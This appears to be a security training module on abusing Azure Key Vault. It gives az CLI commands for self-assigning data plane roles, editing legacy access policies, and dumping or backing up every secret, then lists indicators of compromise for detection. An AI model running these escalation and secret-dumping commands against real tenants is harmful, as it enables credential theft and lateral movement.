# Attack: Module 06 — Azure Key Vault Abuse

## Overview

Azure Key Vault stores an organization's most sensitive assets: application secrets, connection strings, API keys, storage account keys, certificates, and encryption keys. An attacker who gains access to Key Vault can exfiltrate credentials that enable lateral movement across the entire cloud estate.

Two prerequisites govern the attacker's access:
1. **Authentication** — A valid identity (user, service principal, or managed identity) reachable via Microsoft Entra ID
2. **Data plane authorization** — An RBAC role assignment (or legacy access policy) that grants `get`, `list`, or `secrets/get` data plane permissions on the vault

> The **control plane** (management.azure.com) governs vault configuration. The **data plane** (`<vault-name>.vault.azure.net`) is where secrets live. An attacker needs data plane access specifically — control plane access alone cannot read secret values.

Reference: [Azure Key Vault access model — control plane vs. data plane](https://learn.microsoft.com/azure/key-vault/general/rbac-guide)

---

## MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|---|---|---|
| Unsecured Credentials: Cloud Secrets | T1552.008 | Credential Access |
| Valid Accounts: Cloud Accounts | T1078.004 | Persistence, Defense Evasion |
| Cloud Service Discovery | T1526 | Discovery |
| Account Manipulation: Additional Cloud Roles | T1098.003 | Persistence |
| Exfiltration Over Web Service | T1567 | Exfiltration |

---

## Step 1 — Establishing Data Plane Access

Before reading any secrets, the attacker must hold a data plane role. There are two paths:

### Path A — Compromised Principal Already Has Data Plane Access

If the attacker compromises an application service principal, managed identity, or developer account that is legitimately assigned a Key Vault data plane role, they inherit that access immediately.

```bash
# Enumerate which key vaults the compromised identity can access
az keyvault list --query "[].{name:name, uri:properties.vaultUri}" -o table

# Test data plane list access
az keyvault secret list --vault-name <vault-name>

# Retrieve all secrets by combining list + get
az keyvault secret list --vault-name <vault-name> --query "[].{id:id}" -o tsv | \
  xargs -I{} az keyvault secret show --id {}
```

### Path B — Escalating to Data Plane via Control Plane Privilege Abuse

An attacker with `Owner`, `User Access Administrator`, or `Key Vault Data Access Administrator` on the resource group or subscription can **assign themselves a Key Vault data plane role** — even if they had no prior secret access.

```bash
# Assign Key Vault Secrets User to self (escalation via control plane)
az role assignment create \
  --role "Key Vault Secrets User" \
  --assignee <attacker-object-id> \
  --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault>

# Then immediately pull secrets
az keyvault secret list --vault-name <vault-name> -o tsv | \
  awk '{print $1}' | xargs -I{} az keyvault secret show --id {}
```

> **Key risk:** A principal with `Contributor` rights on the control plane can grant themselves data plane access by modifying legacy access policies **or** assigning RBAC roles — bypassing the apparent separation between the two planes.

Reference: [Key Vault access model — important note on Contributor permissions](https://learn.microsoft.com/azure/key-vault/general/rbac-guide)

---

## RBAC Roles an Attacker Can Abuse

Azure Key Vault defines several built-in data plane roles. Attackers target these specifically:

| Role | ID | What It Grants | Attacker Use |
|---|---|---|---|
| **Key Vault Administrator** | `00482a5a-...` | All data plane operations: secrets, keys, certs | Full vault takeover — can read, write, delete everything |
| **Key Vault Secrets User** | `4633458b-...` | Read secret contents (including private key portion of certs) | Secret exfiltration — minimum required for credential theft |
| **Key Vault Secrets Officer** | `b86a8fe4-...` | All secret actions except manage permissions | Can create/update/delete secrets to overwrite legitimate values |
| **Key Vault Reader** | `21090545-...` | Read vault metadata, list secret names — **cannot read secret values** | Secret enumeration / reconnaissance (precursor to escalation) |
| **Key Vault Crypto User** | `12338af0-...` | Encrypt/decrypt/sign/verify with keys | Key abuse for signing malicious payloads or decrypting exfiltrated data |
| **Key Vault Certificate User** | `db79e9a7-...` | Read full certificate including private key | Certificate/private key theft |
| **Key Vault Data Access Administrator** | `8b54135c-...` | Assign/remove the above data plane roles | Privilege escalation — can grant any data plane role without being Owner |

### Enumerating Existing Role Assignments (Attacker Reconnaissance)

```bash
# List all role assignments on a specific vault
az role assignment list \
  --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.KeyVault/vaults/<vault> \
  --include-inherited \
  --query "[].{principal:principalName, role:roleDefinitionName, principalType:principalType}" \
  -o table

# Find all identities with Key Vault Secrets User or higher
az role assignment list --all \
  --query "[?contains(roleDefinitionName, 'Key Vault')].{principal:principalName, role:roleDefinitionName, scope:scope}" \
  -o table
```

### Legacy Access Policy Abuse (Pre-RBAC Vaults)

On vaults still using legacy access policies (pre-API version 2026-02-01), the attacker can modify the policy directly if they hold `Contributor` or higher:

```bash
# Grant self full secret permissions via legacy access policy
az keyvault set-policy --name <vault-name> \
  --object-id <attacker-object-id> \
  --secret-permissions get list set delete backup restore recover purge
```

Reference: [Azure built-in roles for Key Vault data plane operations](https://learn.microsoft.com/azure/key-vault/general/rbac-guide#azure-built-in-roles-for-key-vault-data-plane-operations)

---

## Step 2 — Secret Enumeration and Exfiltration

With data plane access established, the classic attacker sequence is:

**1. List all secrets (SecretList)**
```bash
az keyvault secret list --vault-name <vault-name> -o json | jq '.[].id'
```

**2. Retrieve each secret value (SecretGet)**
```bash
az keyvault secret show --vault-name <vault-name> --name <secret-name> --query value -o tsv
```

**3. List all keys and certificates**
```bash
az keyvault key list --vault-name <vault-name>
az keyvault certificate list --vault-name <vault-name>
```

**4. Backup secrets for offline exfiltration** (SecretBackup — saves encrypted blob)
```bash
az keyvault secret backup --vault-name <vault-name> --name <secret-name> --file /tmp/secret.bak
```

> The `SecretList` → `SecretGet` sequence in rapid succession is the **primary detection pattern** for secret dumping — it is the trigger for the `KV_ListGetAnomaly` Defender for Key Vault alert.

---

## High-Signal Indicators of Compromise

| Indicator | Detail |
|---|---|
| `SecretList` immediately followed by multiple `SecretGet` calls | Secret dumping pattern — attacker enumerating all vault contents |
| New RBAC role assignment on a Key Vault scope from an unexpected principal | Privilege escalation — self-assigned data plane access |
| `VaultPut` (policy change) followed by `SecretGet` | Attacker modified access policy to unlock previously denied secrets |
| Access from TOR exit node IP | Attacker concealing location |
| Access from IP flagged by Microsoft Threat Intelligence | Known malicious infrastructure |
| `SecretBackup` or `KeyBackup` operations | Bulk exfiltration of encrypted secret/key blobs |
| Multiple `SecretGet` operations across many secrets in a short window | Volume anomaly — consistent with automated tooling (e.g., `az keyvault` scripted dump) |
| Service principal accessing vault from a new Azure region or IP not seen before | Account compromise / unusual access pattern |

---

## Microsoft Learn References

- [Azure Key Vault access model — control plane vs. data plane](https://learn.microsoft.com/azure/key-vault/general/rbac-guide)
- [Azure built-in roles for Key Vault data plane operations](https://learn.microsoft.com/azure/key-vault/general/rbac-guide#azure-built-in-roles-for-key-vault-data-plane-operations)
- [Provide access with Azure RBAC (Key Vault)](https://learn.microsoft.com/azure/key-vault/general/rbac-guide)
- [Alerts for Azure Key Vault (Defender for Cloud)](https://learn.microsoft.com/azure/defender-for-cloud/alerts-azure-key-vault)
- [Defender for Key Vault introduction](https://learn.microsoft.com/azure/defender-for-cloud/defender-for-key-vault-introduction)
- [Key Vault logging — operationName reference](https://learn.microsoft.com/azure/key-vault/general/logging)
- [Secure your Azure Key Vault](https://learn.microsoft.com/azure/key-vault/general/secure-key-vault)